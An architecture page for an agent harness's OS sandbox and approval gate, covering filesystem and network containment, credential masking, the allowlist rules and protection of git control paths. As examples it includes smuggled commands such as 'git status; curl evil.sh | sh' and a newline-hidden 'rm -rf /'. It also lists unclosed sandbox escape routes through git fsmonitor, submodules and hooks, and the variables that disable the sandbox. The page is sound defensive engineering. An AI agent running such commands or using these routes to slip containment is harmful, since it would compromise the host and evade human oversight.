---
Title: OS Sandbox
Version: 1.2.0
Type: architecture
Status: accepted
Summary: ""
---
```markdown
---
Title: OS Sandbox
Version: 1.2.0
Type: architecture
Status: accepted
Summary: Kernel-enforced containment layer that constrains what a process can do after the policy engine approves it. Uses macOS Seatbelt or Linux bubblewrap to restrict filesystem access, network reach, and credential exposure. Containment is mandatory for autonomous runs and opt-in for interactive agent sessions. When containment cannot be applied, execution is refused rather than silently degraded.
---
# OS Sandbox

VerifiedAt: 7d38dba02fad6f8f81d8f244f76b08d0b2f59682
VerifiedScope: sha256:5850b7e87a1e0e8035bab240df4bba7039db1e1f6bb3335b109c58311a5806e4

## Summary

The OS sandbox is a kernel-enforced containment layer that sits *below* keryx's
policy engine, structural command guard, env allowlist, and approval gate. Those
layers decide **whether a command may start**; the OS sandbox constrains **what
the process can do once running** — which paths it can write, which secrets it
can read, and which network it can reach — using macOS Seatbelt (`sandbox-exec`)
or Linux bubblewrap (`bwrap`). It adds no npm dependencies: containment is
delegated to system binaries. When containment cannot be applied, a run is
**refused**, never silently downgraded.

## Entry Paths and Defaults

| Path | Default | Rationale |
|---|---|---|
| `keryx harness exec` (autonomous) | **contained by default** | No human reviews each command; containment cannot be optional. |
| Agent `shell_exec` (interactive) | **opt-in** via `KERYX_SANDBOX_SHELL` | A human approves every command, and default-on breaks tools writing to global caches (`~/.bun`, `~/.npm`, `~/.cargo`) — which trains users to disable the sandbox outright. |

## Sandbox Profile

A `SandboxProfile` is projected from the policy profile and carries:

- **Filesystem `mode`**: `read-only` | `workspace-write` | `danger-full-access`
- **Network `mode`**: `off` | `on` | `restricted`
- **Writable roots**: explicitly permitted write paths
- **Secret read-deny list**: paths masked from the contained process
- **Allowed domains**: hostname patterns for restricted network
- **Proxy address**: optional loopback proxy for restricted network
- **`required`**: fail-closed flag

### Default Posture (v1)

- **Network**: off
- **Writes**: restricted to the working directory and session temp dir
- **Reads**: all other host paths are read-only
- **Masked paths**: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.config/keryx`, `~/.netrc`

## Restricted Network Mode

When `network: restricted`, the OS layer denies all direct network access. The contained process can only reach hosts through a loopback allowlist proxy, pointed at via `HTTP(S)_PROXY`.

### Proxy Behavior

- The proxy enforces the domain allowlist (e.g., `*.d.com` covers apex `d.com`)
- Every allow/deny decision is reported back to the caller
- A denied host receives a `403` response

This reporting is **load-bearing**: `curl` treats a `403` as a successful HTTP transaction and exits `0`. Without explicit decision reporting, a blocked request is indistinguishable from a successful one.

### Implementation Note

The proxy runs in a **worker thread** because the contained command is spawned with `spawnSync`, which blocks the main event loop for the entire run.

## Credential Masking and TLS Termination

A masked credential never enters the contained process. Instead, the process receives a per-run sentinel (`keryx-sentinel-<uuid>`), and the proxy substitutes the real value on the wire — but only for named hosts.

### HTTPS Requirement

Over HTTPS, TLS termination is mandatory. A blind `CONNECT` relay cannot rewrite encrypted bytes. Therefore, `--mask-env` without `--tls-terminate` is **rejected** rather than silently half-working.

### Run CA Trust Delivery

Trust in the run CA is delivered through environment variables only:

- `SSL_CERT_FILE`
- `CURL_CA_BUNDLE`
- `NODE_EXTRA_CA_CERTS`
- `REQUESTS_CA_CERTS`
- `GIT_SSL_CAINFO`

The run CA is **never** added to the system trust store, because a run-scoped MITM certificate must not become a host-wide trust decision.

### Go Tool Limitation

Go's `crypto/tls` ignores these environment variables. Go tools (`gh`, `terraform`, `kubectl`, `docker`) therefore fail under TLS termination. This is a known, documented limitation.

## Platform Matrix

| Capability | macOS | Linux | Windows |
|---|---|---|---|
| Filesystem containment, secret masking | yes | yes | no launcher |
| Network off | yes | yes | no launcher |
| Domain allowlist, credential masking, TLS termination | yes | **fails closed** | no launcher |

### Linux Network Restriction

Restricted network requires "deny all network except this one loopback socket". Seatbelt expresses this directly. Bubblewrap cannot — `--unshare-net` gives the process its own loopback, not the one the proxy listens on — so it would need a network namespace plus a relay. This is not built; Linux falls back to fail-closed.

## The Approval Gate: The Layer That Is Usually Load-Bearing

Because agent `shell_exec` defaults to **off**, the layer that actually stands between a model-proposed command and the host is almost always the approval gate, not the OS sandbox. On a host without a launcher installed, the approval gate is the **only** layer at all.

Anyone reasoning about the security of the interactive agent should start here.

### Default-Deny Contract

- `runAgentTurn` never executes a `shell`-risk tool without an approver returning approval
- An absent approver is a denial
- A user allowlist (`~/.local/share/keryx/permissions.json`) provides glob patterns that auto-approve without prompting

### Allowlist Pattern Matching: A Critical Warning

**A pattern matched against the raw command string is not a boundary by itself.**

The string it matches is handed to `/bin/sh -c`, which re-interprets it. A bare `*` expands to "any run of characters **including newlines**".

Real-world examples from live allowlists:

| Pattern | Actual Coverage |
|---|---|
| `git *` | `git status; curl evil.sh \| sh` |
| `cd *` | `cd /tmp && …` |
| `# *` | `"# note\nrm -rf /"` |

This was not theoretical — flow 115 observed `bash *`, `python3 *`, `curl *`, `cd *`, `# *`, `docker *`, `sudo *`, and the exact string `rm -rf /` on two hosts.

### Four Allowlist Constraints

| Rule | Applies To | Effect |
|---|---|---|
| **Unquoted metacharacters** | the command | `; && \|\| \| \` $( < > &` or a newline outside quotes ⇒ never auto-approved, never remembered. Quote-aware, so `git commit -m "fix: a; b"` is unaffected. |
| **Destructive classification** | the command | A destructive command is never auto-approved and never remembered, however exactly a pattern matches it. |
| **Own-credential access** | the command | Any mention of `permissions.json` / `auth.json` / keryx config dirs forces a prompt and can never be remembered — otherwise one approved command disables the gate permanently. |
| **No bare interpreter grants** | the pattern | `<interpreter> *` is refused (`bash *`, `docker *`, `git *`, …). A narrower pattern that constrains arguments (`bun test*`) is still allowed. |

### Why Rules Apply to the Command, Not the Pattern

The first three rules deliberately apply to the **command**, not the pattern. A pattern written by an older keryx or hand-edited into the file has not passed validation. Loading partitions stored patterns and reports refused ones instead of deleting them; the session also fingerprints the file and warns if it changes underneath.

### Known Limitations

1. **Destructive classifier escalates, never blocks**: Any list of dangerous commands is incomplete, and a check that reads as a grant is worse than no check. The classifier escalates confirmation ([ADR-0009](../../../docs/decisions/keryx-harness/ADR-0009-destructive-command-escalation.md)).

2. **Interpreter list is expedient, not a boundary**: The metacharacter rule and the classifier are the actual boundaries.

3. **Heredocs and redirects trigger prompts**: A heredoc or redirect (`cat > f <<'EOF'`) carries metacharacters, so it asks every time. Separating a redirect from a heredoc body needs a shell parser, which is a worse failure surface than one extra confirmation.

## Repository Control Paths (`git-protect.ts`)

`workspace-write` makes the whole cwd writable, `.git` included. Some files in a
git dir are code the **host** runs on its next git command, outside any sandbox,
so one contained write would become uncontained execution. Both launchers make
them read-only again after the writable-root rules.

### What is protected

| Path | Why git runs code from it |
|---|---|
| `hooks/` | hook scripts (`post-checkout`, `pre-commit`, …) |
| `config` | `core.fsmonitor`, `core.hooksPath`, `core.sshCommand`, filter and diff drivers, `!` aliases |
| `config.worktree` | the same keys, per worktree, once `extensions.worktreeConfig` is on |
| `commondir` | git reads it for **any** git dir and takes config and hooks from where it points |
| the `.git` gitdir **file** of a linked worktree or submodule root | repointing it picks a different repository |

Each is protected **whether or not it exists yet**: creating `.git/hooks/post-checkout`
in a repo that has no hooks dir, or a `.git/commondir` in an ordinary checkout, is as
good as editing an existing one (both confirmed live on macOS in review round 2).
The set follows the repository: a gitdir file into a writable root, that gitdir's
`commondir`, a submodule gitdir, and each `.git/worktrees/<name>/` (its `commondir`
and `config.worktree`).

**Anchors.** Each protected git dir, and every directory between it and the
outermost writable root, must also stay in place: renaming `.git` away and creating a
fresh one sidesteps every rule on the old path.

Not protected, on purpose: `info/` (`info/attributes` can only *name* a filter or
diff driver; the command comes from config, and a working-tree `.gitattributes` can
name the same drivers), `objects/`, `refs/`, `logs/`, the index and the lock files
git creates beside them — a contained `git add` / `git commit` needs those.

### macOS (Seatbelt)

`(deny file-write* (subpath <p>))` for every control path, existing or not — SBPL
denies a missing path just as well. A symlinked entry is denied under its name and
its target. Anchors get `(deny file-write* (literal <dir>))`, which blocks renaming
or removing the directory but not writing inside it. Verified live
(`containment.smoke.test.ts`, gated on `KERYX_ALLOW_REAL_SUBPROCESS=1`).

### Linux (bubblewrap)

bwrap protects by mounting, and a mount needs an existing mount point.

- **Anchors** are bound onto themselves (`--bind d d`). Linux refuses `rename(2)` of
  a dentry that is itself a mount point (`EBUSY`), so `mv .git x && git init` fails.
  Being only an ancestor of a mount point is not enough — that was the round-2 gap.
- **Existing** control paths: `--ro-bind p p`.
- **Missing** ones need a mount point, which bwrap creates through the writable bind,
  so it is **left behind on the host**. That is done only where the leftover is
  inert: `hooks` gets an empty read-only tmpfs (an empty `hooks/` is what `git init`
  makes), `config` / `config.worktree` get `/dev/null` (an empty config file is
  valid).
- **A missing `commondir` stays creatable on Linux.** Any mount point there — an
  empty file or a directory — makes git die with `failed to read .git/commondir`,
  inside the sandbox and on the host afterwards, so there is no inert placeholder.
- **Why not "`.git` read-only, re-bind the writable parts"?** git creates its lock
  files (`index.lock`, `HEAD.lock`, `packed-refs.lock`, `ORIG_HEAD`, `COMMIT_EDITMSG`, …)
  as **new** entries at the top of `.git` and renames them into place; a read-only
  `.git` makes `git add` and `git commit` fail, and a lock file that does not exist
  yet cannot be pre-bound.
- Closing `commondir` on Linux needs a check outside the sandbox after the run (the
  contained process tree is gone once bwrap exits, so a "did a control path appear?"
  check in the spawner is race-free). Not built yet.

The Linux side is verified only by unit tests over the generated argv; no Linux
kernel ran it in this change.

### Accepted cost: `.git/config` is read-only

git rewrites config by writing `config.lock` and renaming it over `config`, which
the protection refuses. Inside the sandbox these fail with
`error: could not write config file .git/config`:
`git config <key> <value>`, `git remote add`, `git push -u` / `--set-upstream`,
`git branch --set-upstream-to`, `git checkout -b X origin/X` (tracking), `git submodule add|init`.

This is deliberate. `config` is a code-execution vector (`core.fsmonitor`,
`core.hooksPath`, `core.sshCommand`, filters, `!` aliases); making it writable and
re-checking it afterwards means parsing git config (includes, conditional includes,
every key that runs a command) to the same standard as git itself. Workarounds:
per-command config (`git -c user.email=… commit`), the environment
(`GIT_AUTHOR_NAME`, `GIT_COMMITTER_EMAIL`, …), or running the config-writing step
outside the sandbox with an approval. There is no sandbox-aware refusal message yet;
the error is git's own. The cost is pinned by a live smoke test, so changing it is a
decision, not an accident.

### Still open (not closable by protecting `.git`)

- **Nested repositories registered as submodules.** A contained command can create
  `sub/.git` (a full repo with `core.fsmonitor`), a `.gitmodules` entry and a gitlink
  in the index — all in the writable tree. The host's next `git status` in the
  superproject recurses into `sub` and runs the fsmonitor (reproduced with git 2.51).
- **Hooks that run working-tree code** (husky, lefthook, pre-commit, `core.hooksPath`
  inside the repo): the hook itself may be protected, the scripts it runs are not.
- **A gitdir symlinked from `.git`, or a symlinked control entry, on Linux**: a mount
  follows the link, so the link itself can still be replaced.
- **`include.path` in `.git/config` naming a file in the working tree.**

These need a host-side git policy (for example running host git with
`-c core.fsmonitor= -c core.hooksPath=/dev/null -c submodule.recurse=false` after a
contained run), not a sandbox rule.

### The `/run` hide and PATH (Linux, interactive)

The interactive bwrap profile hides `/run` (and `/var/run`, `$XDG_RUNTIME_DIR`)
behind an empty tmpfs, because host service sockets live there. NixOS also keeps
the system PATH there (`/run/current-system/sw/bin`, setuid wrappers in
`/run/wrappers/bin`). Each PATH entry under a hidden dir is bound back read-only —
the entry itself, never a parent — unless it resolves to a hidden dir, the runtime
dir or a parent of one, or holds a unix socket. The unattended profile has the same
`/run` hide and does not bind PATH entries back yet.

## Fail-Closed Behavior

A missing launcher or an unsupported posture produces a `blocked` outcome with a stated reason. There is no code path that runs a command uncontained after containment was requested.

Explicit escape hatches exist for edge cases:

- `KERYX_DANGEROUSLY_DISABLE_SANDBOX=1`
- `KERYX_SANDBOX_ALLOW_UNSANDBOXED=1`

These are human-set and must be explicitly enabled.

## Verification Discipline

A sandbox that fails to launch blocks everything — which looks exactly like perfect containment. Every boundary is therefore verified as a **pair**:

1. The denied case fails
2. The allowed case succeeds

This discipline caught a real defect: bubblewrap masked secret paths unconditionally, and mounting over a non-existent path aborts the whole sandbox. The Linux sandbox failed to start on any host lacking `~/.aws` or `~/.gnupg`.

## Related Code

| Module | Purpose |
|---|---|
| `src/harness/process/sandbox/` | Profile, launchers, dispatcher, adapter, proxy, run CA |
| `src/harness/process/sandbox/profile.ts` | `SandboxProfile`, policy projection |
| `src/harness/process/sandbox/seatbelt.ts` | macOS launcher |
| `src/harness/process/sandbox/bwrap.ts` | Linux launcher |
| `src/harness/process/sandbox/wrap.ts` | Platform dispatch, unsupported-posture refusal |
| `src/harness/process/sandbox/adapter.ts` | Fail-closed `ProcessAdapter` decorator |
| `src/harness/process/sandbox/proxy.ts` | Allowlist proxy |
| `src/harness/process/sandbox/network-run.ts` | Run lifecycle |
| `src/commands/harness.ts` | `keryx harness exec` CLI surface |
| `src/harness/tool/builtin/shell-exec-tool.ts` | Agent shell opt-in |
| `src/commands/agent.ts` | Default-deny risk gate, approval binding, escalation |
| `src/lib/shell-permissions.ts` | Allowlist and three command-level barriers |
| `src/lib/command-risk.ts` | Destructive classification, own-credential detection |
| `src/lib/shell-syntax.ts` | Quote-aware scanner for both classifiers |

## Documentation Package

Full documentation lives in `docs/requirements/keryx-os-sandbox/`:

- [README](../../../docs/requirements/keryx-os-sandbox/README.md) — index, status, platform matrix
- [PRD](../../../docs/requirements/keryx-os-sandbox/prd.md) — problem, goals, risks, gaps
- [Specification](../../../docs/requirements/keryx-os-sandbox/specification.md) — profile shape, launcher details, CLI/env surface, contracts
- [Operator Guide](../../../docs/requirements/keryx-os-sandbox/operator-guide.md) — for humans
- [Agent Protocol](../../../docs/requirements/keryx-os-sandbox/agent-protocol.md) — for agents
- [Verification Record](../../../docs/requirements/keryx-os-sandbox/verification.md) — what was proven and what was not
- [Linux verification runbook](../../../docs/verification/linux-sandbox-verification.md) — manual validation on a real host

### Related Decisions

- [ADR-0006: OS Sandbox Shell Exec](../../../docs/decisions/keryx-harness/ADR-0006-os-sandbox-shell-exec.md)
- [ADR-0007: TLS Terminate HTTPS Credential Masking](../../../docs/decisions/keryx-harness/ADR-0007-tls-terminate-https-credential-masking.md)

## Related Wiki

- [Wiki Index](../index.md)
- [src/harness](../components/src-harness.md)
- [src/commands](../components/src-commands.md)

## Changelog

| Version | Changes |
|---|---|
| 1.2.0 | Added repository control paths: what is protected (existing or not), anchors, the Seatbelt vs bubblewrap mechanics and why a missing `commondir` stays open on Linux, the read-only `.git/config` cost and its workarounds, vectors that protecting `.git` cannot close, and the NixOS PATH bind-back under the `/run` hide. |
| 1.1.0 | Added the approval-gate / allowlist permission model and its limits: the page described containment but not the layer that is load-bearing when containment is off (the default) or unavailable. |
| 1.0.0 | Documented the implemented OS sandbox: postures, restricted network, credential masking, TLS termination, platform matrix, fail-closed contract, and the documentation package. |
| 0.1.0 | Initial version. |
```
